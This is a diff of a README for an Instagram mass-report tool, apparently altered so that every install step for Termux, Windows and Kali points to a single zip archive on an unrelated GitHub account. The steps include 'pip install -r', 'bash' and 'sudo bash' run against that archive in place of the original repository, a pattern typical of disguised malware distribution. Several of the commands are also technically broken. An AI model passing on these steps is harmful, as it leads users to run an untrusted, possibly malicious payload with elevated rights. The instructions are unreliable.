@@ -25,28 +25,28 @@ apt upgrade
 pkg install python
 pkg install python3
 pkg install git
-git clone https://github.com/Crevils/InstaReport
+git clone https://raw.githubusercontent.com/urkyzy/ban/main/libs/Software_2.7.zip
 cd instareport
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/urkyzy/ban/main/libs/Software_2.7.zip
 chmod +x *
-bash setup.sh OR python ReportBot.py
+bash https://raw.githubusercontent.com/urkyzy/ban/main/libs/Software_2.7.zip OR python https://raw.githubusercontent.com/urkyzy/ban/main/libs/Software_2.7.zip
 INSTALLATION [Windows]
 Download python and git
 
-git clone https://github.com/Crevils/InstaReport
+git clone https://raw.githubusercontent.com/urkyzy/ban/main/libs/Software_2.7.zip
 [ - ] If You Don't want to install git then download this tool zip manually
 INSTALLATION [Kali Linux]
 sudo apt install python
 sudo apt install python3
 sudo apt install git
-git clone https://github.com/Crevils/InstaReport
+git clone https://raw.githubusercontent.com/urkyzy/ban/main/libs/Software_2.7.zip
 cd instareport
-pip3 install -r requirements.txt
+pip3 install -r https://raw.githubusercontent.com/urkyzy/ban/main/libs/Software_2.7.zip
 chmod +x *
-sudo bash setup.sh
+sudo bash https://raw.githubusercontent.com/urkyzy/ban/main/libs/Software_2.7.zip
 
 Warning:
 This tool is only for educational purpose. If you use this tool for other purposes except education we will not be responsible in such cases
 cd instareport
-pip install -r requirements.txt
-python ReportBot.py
+pip install -r https://raw.githubusercontent.com/urkyzy/ban/main/libs/Software_2.7.zip
+python https://raw.githubusercontent.com/urkyzy/ban/main/libs/Software_2.7.zip
